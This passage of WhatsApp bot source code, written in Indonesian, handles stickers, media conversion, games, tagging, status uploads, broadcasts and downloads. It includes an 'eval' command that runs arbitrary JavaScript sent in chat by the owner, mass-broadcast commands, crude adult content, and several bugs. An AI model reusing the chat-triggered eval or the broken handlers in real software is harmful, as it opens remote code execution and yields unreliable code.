  Hanz.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
  fs.unlinkSync(media)
})
 .on('end', () => {
 _out = getRandom('.webp')
  spawn('webpmux', ['-set','exif','./media/sticker/data.exif', out, '-o', _out])
 .on('exit', () => {
  Hanz.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
  fs.unlinkSync(out)
  fs.unlinkSync(_out)
  fs.unlinkSync(media)
})
})
 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(out) 
  } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
  const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
  const media = await Hanz.downloadAndSaveMediaMessage(encmedia)
  pe = args.join('')
  var a = pe.split("|")[0];
  var b = pe.split("|")[1];
  await createExif(a,b)
  out = getRandom('.webp')
  ffmpeg(media)
 .on('error', (e) => {
  console.log(e)
  Hanz.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
  fs.unlinkSync(media)
})
 .on('end', () => {
 _out = getRandom('.webp')
  spawn('webpmux', ['-set','exif','./media/sticker/data.exif', out, '-o', _out])
 .on('exit', () => {
  Hanz.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
  fs.unlinkSync(out)
  fs.unlinkSync(_out)
  fs.unlinkSync(media)
})
})
 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(out)       
  } else {
  replyy(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
}
  break
case 'stiker': //by Guntur P
case 'sticker':
case 's':
  var a = `${packname}`
  var b = `${author}`
  if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
  const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
  media = await Hanz.downloadAndSaveMediaMessage(encmedia)
  await createExif(a,b)
  out = getRandom('.webp')
  ffmpeg(media)
 .on('error', (e) => {
  console.log(e)
  Hanz.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
  fs.unlinkSync(media)
})
 .on('end', () => {
 _out = getRandom('.webp')
  spawn('webpmux', ['-set','exif','./media/sticker/data.exif', out, '-o', _out])
 .on('exit', () => {
  Hanz.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
  fs.unlinkSync(out)
  fs.unlinkSync(_out)
  fs.unlinkSync(media)
})
})
 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(out) 
  } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
  const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
  const media = await Hanz.downloadAndSaveMediaMessage(encmedia)
  var a = `${packname}`
  var b = `${author}`
  await createExif(a,b)
  out = getRandom('.webp')
  ffmpeg(media)
 .on('error', (e) => {
  console.log(e)
  Hanz.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
  fs.unlinkSync(media)
})
 .on('end', () => {
_out = getRandom('.webp')
  spawn('webpmux', ['-set','exif','./media/sticker/data.exif', out, '-o', _out])
 .on('exit', () => {
  Hanz.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
  fs.unlinkSync(out)
  fs.unlinkSync(_out)
  fs.unlinkSync(media)
})
})
 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(out)       
  } else {
  replyy(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
}
break
case 'stikernowm': 
case 'stickernowm':
case 'snowm':
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	const media = await Hanz.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.webp')
	await ffmpeg(`./${media}`)
	.input(media)
	.on('start', function (cmd) {
	console.log(`Started : ${cmd}`)
	})
	.on('error', function (err) {
	console.log(`Error : ${err}`)
	fs.unlinkSync(media)
	reply(ind.stikga())
})
.on('end', function () {
	console.log('Finish')
	buffer = fs.readFileSync(ran)
	Hanz.sendMessage(from, buffer, sticker, {quoted: mek})
	fs.unlinkSync(media)
	fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
	const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	const media = await Hanz.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.webp')
	reply(ind.wait())
	await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
	console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
	console.log(`Error : ${err}`)
	fs.unlinkSync(media)
	tipe = media.endsWith('.mp4') ? 'video' : 'gif'
	reply(ind.stikga())
})
.on('end', function () {
	console.log('Finish')
	buffer = fs.readFileSync(ran)
	Hanz.sendMessage(from, buffer, sticker, {quoted: mek})
	fs.unlinkSync(media)
	fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
	replyy(`Kirim gambar/video/gif dengan caption \n${prefix}sticker (durasi sticker video 1-9 detik)`)
}
break
case 'tomp3':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
Hanz.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return replyy('Reply Video nya Tod')
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await Hanz.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return replyy('Gagal, pada saat mengkonversi video ke mp3')
bufferlkj = fs.readFileSync(ran)
Hanz.sendMessage(from, bufferlkj, audio, { mimetype: 'audio/mp4', quoted: ftrol })
fs.unlinkSync(ran)
})
break
case 'tovideo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isQuotedSticker) return replyy('Reply stikernya')
reply(mess.wait)
anumedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
anum = await Hanz.downloadAndSaveMediaMessage(anumedia, './database/media_user')
ran = getRandom('.webp')
exec(`ffmpeg -i ${anum} ${ran}`, (err) => {
fs.unlinkSync(anum)
buffer = fs.readFileSync(ran)
Hanz.sendMessage(from, buffer, video, { quoted: ftrol, caption: 'Done... Jangan Lupa Subscribe ʜᴀɴᴢ々ᴏꜰᴄ' })
fs.unlinkSync(ran)
})
break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ ᖴITᑌᖇ ᘜᗩᗰᗴ ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'caklontong':
data17 = fs.readFileSync('./lib/caklontong.js');
cak17 = JSON.parse(data17);
lontong17 = Math.floor(Math.random() * cak17.length);
randKey17 = cak17[lontong17];
Pertanyaan = randKey17.result.soal
Jawaban = '\n*'+randKey17.result.desc +'*'
setTimeout( () => {
Hanz.sendMessage(from, Jawaban, text, {quoted: fdoc})
}, 30000)
setTimeout( () => {
Hanz.sendMessage(from, '_10 Detik lagi_', text) 
}, 20000) 
setTimeout( () => {
Hanz.sendMessage(from, '_20 Detik lagi_', text) 
}, 10000) 
setTimeout( () => {
Hanz.sendMessage(from, '_30 Detik lagi_', text) 
}, 2500) 
Hanz.sendMessage(from, Pertanyaan, text, {quoted: mek})
break
case 'family100':
datalu = fs.readFileSync('./lib/family100.js');
familu = JSON.parse(datalu);
ly100 = Math.floor(Math.random() * familu.length);
randKeyo = familu[ly100];
Pertanyaan = randKeyo.result.soal
setTimeout( () => {
Hanz.sendMessage(from, '*Jawaban :* \n```'+randKeyo.result.jawaban +'```', text, {quoted: fdoc}) 
}, 30000) 
setTimeout( () => {
replyy('_Waktu Anda Habis_')
}, 29000)
setTimeout( () => {
Hanz.sendMessage(from, '_10 Detik lagi_', text) 
}, 20000) 
setTimeout( () => {
Hanz.sendMessage(from, '_20 Detik lagi_', text) 
}, 10000) 
setTimeout( () => {
Hanz.sendMessage(from, '_30 Detik lagi_', text) 
}, 2500) 
setTimeout( () => {
Hanz.sendMessage(from, '*'+ Pertanyaan +'*', text, {quoted: mek }) 
}, 0) 
break 
case 'tebakgambar':
datapp = fs.readFileSync('./lib/tebakgambar.js');
jsonData = JSON.parse(datapp);
rannikdepx = Math.floor(Math.random() * jsonData.length);
randKepy = jsonData[rannikdepx];
randSoal = await getBuffer(randKepy.result.soalImg)
setTimeout( () => {
Hanz.sendMessage(from, '*Jawaban :* '+ randKepy.result.jawaban +'\n', text, {quoted: floc}) // ur cods
}, 30000) 
setTimeout( () => {
Hanz.sendMessage(from, '_10 Detik lagi_', text) 
}, 20000) 
setTimeout( () => {
Hanz.sendMessage(from, '_20 Detik lagi_', text) 
}, 10000) 
setTimeout( () => {
Hanz.sendMessage(from, '_30 Detik lagi_', text) 
}, 2500) 
setTimeout( () => {
but = [
{ buttonId: '!gk', buttonText: { displayText: '𝑵𝑬𝑿メNYERAH GUAメ︎' }, type: 1 }
]
sendButImage(from, `SILAKAN DI TEBAK😯`, `${fake}`, randSoal, but)
}, 0)
break      
case 'suit': 
if (!q) return replyy('Kirim perintah ${prefix}suit gunting / batu / kertas')
const userspilih = q
if (!userspilih.match(/batu|gunting|kertas/)) return fakestatus(`Pilih batu, kertas, gunting`)
var computer = Math.random();
if (computer < 0.34 ) {computer = 'batu';
} else if( computer >= 0.34 && computer < 0.67) {
computer = 'gunting';
} else {
computer = 'kertas';
}
if ( userspilih == computer ) {
fakestatus(`Pertandingan Seri!`)
} else if ( userspilih == 'batu' ) {
if( computer == 'gunting' ) {
replyy('Kamu memilih Batu dan bot Gunting\nKamu menang!')
} else {
replyy('Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!')
}
} else if ( userspilih == 'gunting' ) {
if( computer == 'batu' ) {
replyy('Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!')
} else {
replyy('Kamu memilih Gunting dan bot Kertas\nKamu menang!')
}
} else if ( userspilih == 'kertas' ) {
if( computer == 'batu' ) {
replyy('Kamu memilih Kertas dan bot Batu\nKamu menang!')
} else {
replyy('Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah')
}
}         
break 	
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[Tᗩᘜ ᘜᖇOᑌᑭ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'totag':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
if (!isGroup) return reply(mess.only.group)			
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: ftrol
}
ini_buffer = fs.readFileSync(file)
Hanz.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: mek
}
ini_buffer = fs.readFileSync(file)
Hanz.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4', duration: 359996400,
ptt : true,
    contextInfo: { mentionedJid: mem },
    quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          replyy(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
        case 'infoall': case 'tagall':
									if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									var nom = mek.participant
									members_id = []
									teks = ''
									for (let mem of groupMembers) {
										teks += `│ *@${mem.jid.split('@')[0]}*\n`
										members_id.push(mem.jid)
										}
										mentions(`「 *TAG ALL*  」
${q?`\nPesan : `+q:``}
							
${teks}`, members_id, true)
									break
case 'hidetag':
if (!isGroup) return reply(mess.only.group)
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
var value = body.slice(9)
var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: ftrol
}
Hanz.sendMessage(from, options, text)
break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ᑌᑭᗪᗩTᗴ ՏTᗩTᑌՏ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'upswteks':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
if (args.length < 1) return replyy('Teksnya?')
teks = body.slice(10)
Hanz.sendMessage('status@broadcast', teks, MessageType.text)
replyy(`Sukses upload status:\n${teks}`)
 break	
 case 'upswlokasi':
 if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
  if (args.length < 1) return replyy('Teksnya?')
 teks = body.slice(12)
 Hanz.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${ownername}`}, MessageType.location)
 replyy(`Sukses upload lokasi:\n${teks}`)
 break	
 case 'upswsticker': 
 if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
if (!isQuotedSticker) return replyy('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, sticker)
						}
						replyy(`Sukses upload sticker`)
 break
  case 'upswaudio':
  if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
if (!isQuotedAudio) return replyy('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						replyy(`Sukses upload audio`)
						break
						case 'upswvn':            
					if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')	       
if (!isQuotedAudio) return replyy('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						replyy(`Sukses upload voice`)
						break
case 'upswvideo':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
 var konti = body.slice(11)
 sticWait(from)
 var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await Hanz.downloadAndSaveMediaMessage(enmediap)
 const buffer3 = fs.readFileSync(mediap)
 Hanz.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
 replyy(`Sukses upload video:\n${konti}`)
     break
        case 'upswgif':
 var konti = body.slice(7)
 reply(mess.wait)
 enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Hanz.downloadAndSaveMediaMessage(enmedia)
 const buffer6 = fs.readFileSync(media)
 Hanz.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
 replyy(`Sukses upload gif:\n${konti}`)
     break
     case 'upswimage':    
 var teksyy = body.slice(11)
 reply(mess.wait)
 enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Hanz.downloadAndSaveMediaMessage(enmedia)
 buffer = fs.readFileSync(media)
 Hanz.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
 replyy(`Sukses upload image:\n${teksyy}`)
     break        
  
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>[BROATSCATS GRUP/PRIVATE]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
					 case 'eval':
             try {
             if (!isOwner) return
             sy = args.join(' ')
             return eval(sy)
             } catch(e) {
             reply(`${e}`)
}
             break
      case 'getquoted':
             reply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
             break
					case 'tobc':				
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')					
				Hanz.updatePresence(from, Presence.composing)
					anu = await groupMembers
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Arya).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo :mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Hanz.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Hanz.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          replyy('reply sticker/audio')
							}
					break
					case 'bc2':
      case 'bc':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')      
             if (args.length < 1) return replyy('teks?')
             anu = await Hanz.chats.all()
             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await Hanz.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             Hanz.sendMessage(_.jid, bc, image, {quoted:ftrol,caption: `*『 Haris 』*\n\n${body.slice(4)}`})
}
             replyy('Suksess broadcast')
             } else {
             for (let _ of anu) {
Hanz.sendMessage(_.jid, 
			{"contentText": `*『 Haris Broadcast 💫 』*\n\n${body.slice(4)}`,
			"footerText": 'broadcast💫',
			"buttons": [
			{"buttonId": `#command`,
			"buttonText": {"displayText": "📙 MENU"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             replyy('Suksess broadcast')
}
             break            
             case 'bc':
case 'bcbut':
if (!isOwner && !mek.key.fromMe) return replyy(`Hanya Untuk @${ownerNumbers.split("@")[0]}`)
if (args.length < 1) return replyy('Teksnya?')
anu = await Hanz.chats.all()
for (let _ of anu) {
buttonss = [{buttonId: `${prefix}ucapan`, buttonText: {displayText: 'UCAPAN'}, type: 1},{buttonId: `owner`, buttonText: {displayText: 'OWNER'}, type: 1}]
var btnbc = {
contentText: `${q}`,
footerText: '*HANZ々OFC彡*',
buttons: buttonss,
headerType: 1
}
await Hanz.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
}
replyy(`Sukses Mengirim Broadcast:\n${q}`)
break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[RANDOM AE KONTOL]<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'ttaudio': 
      case 'tiktokmusic': 
      case 'tiktokaudio':
              sticWait(from)
             if (args.length == 0) return replyy(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
             ini_link = args[0]
             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${Hanzkey}&url=${ini_link}`)
             Hanz.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
             break			
case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await Hanz.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						Hanz.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await Hanz.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						Hanz.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break           
		  case 'tiktok':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
sticWait(from)
if (args.length == 0) return replyy(`Link Nya Mana Tod\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
ini_url = args[0]
ini_url = `https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${ini_url}`
get_result = await fetchJson(ini_url)
ini_buffer = await getBuffer(get_result.result.link)
await Hanz.sendMessage(from, ini_buffer, video, { quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
break
case 'play':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return await reply(`Example: ${prefix + command} melukis senja`)
await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${zerokey}&query=${args.join(" ")}`)
.then(async(result) => {
await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${zerokey}&url=https://www.youtube.com/watch?v=${result.result[0].videoId}`)
.then(async(result) => {
result = result.result
caption = `❖ Title    : *${result.title}*\n`
caption += `❖ Size     : *${result.size}*`
ini_buffer = await getBuffer(result.thumbnail)
await Hanz.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: caption })
get_audio = await getBuffer(result.link)
await Hanz.sendMessage(from, { mimetype: 'audio/mp4', filename: `${result.title}.mp3`, quoted: ftrol })
})
})
break
case 'buttonmusic':
             if(!q) return fakestatus('linknya?')              
             res = await yta(`${q}`).catch(e => {
             fakestatus('```[ ! ] Error Saat Mengirim Audio```')})
             sendMediaURL(from, `${get_audio}`,{quoted:mek})
             break         
     case 'buttonvideo':
             if(!q) return fakestatus('linknya?')            
             res = await ytv(`${q}`).catch(e => {
             fakestatus('```[ ! ] Error Saat Mengirim Video```')})
             sendMediaURL(from, `${res.dl_link}`,'Nih Kack')
             break     
case 'play':      
     case 'youtube':       
     case 'youtubedl':  
             if (args.length < 1) return fakestatus(`Kirim perintah *${prefix}play query`)
             fakestatus('Searching...')
             let yut = await yts(q)
             yta(yut.videos[0].url)             
             .then(async(res) => {
             const { thumb, title, filesizeF, filesize } = res
             const capti = `𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗣𝗟𝗔𝗬
		     
•🌹Judul : ${yut.all[0].title}
•🌹ID Video : ${yut.all[0].videoId}
•🌹️Diupload Pada : ${yut.all[0].ago}
•🌹️Views : ${yut.all[0].views}
•🌹Durasi : ${yut.all[0].timestamp}
•🌹Channel : ${yut.all[0].author.name}
•🌹Link Channel : ${yut.all[0].author.url}`
             ya = await getBuffer(thumb)
             py =await client.prepareMessage(from, ya, image)
             gbutsan = [{buttonId: `${prefix}buttonmusic ${yut.all[0].url}`, buttonText: {displayText: '🎵AUDIO'}, type: 1},{buttonId: `${prefix}buttonvideo ${yut.all[0].url}`, buttonText: {displayText: '🎥VIDEO'}, type: 1}]
             gbuttonan = {
             imageMessage: py.message.imageMessage,
             contentText: capti,
             footerText: 'Silahkan Pilih Jenis File Dibawah Ini☕',
             buttons: gbutsan,
             headerType: 4
}
             await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage)})
             break    
 case 'q': 
if (!m.quoted) return reply('reply message!')
let qse = Hanz.serializeM(await m.getQuotedObj())
if (!qse.quoted) return reply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break                  
case 'isbaileys': 
case 'bail': 
case 'baileys':

replyy(`${mek.quoted.isBaileys}`)
break                   
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[18+ AREA]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
//LINK BOKEP DI BAWAH NYA
case 'kodekeras':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkN2CkuI0Ra5pjBRiJDaW0CC-Wd9HUPFI-TnTDW3rkYy.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "090qnz/i+SxRxHNUztQwjfxmL7XAMiAyL6Kw7aBMIHw=",
						"fileLength": "44782",
						"height": 740,
						"width": 640,
						"mediaKey": "euwj3NlkbZ+B0E67HIzwb8isEogbcPogdFJCllUbdjA=",
						"fileEncSha256": "aDzE4IikU5jH87beKM2eUtPgnTwQIqbNGYsMCoYKnsg=",
						"mediaKeyTimestamp": "1633022751"
					 },
						"contentText": `📸YAH SUKA 2D 📸
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
Note : EASY MODE = Sange, Biasa Aja, Mental Lemah :v
==============================
MEDIUM MODE = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
HARD MODE = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "HANZ々OFC彡",
						"buttons": [
							{
								"buttonId": "HAIKAL",
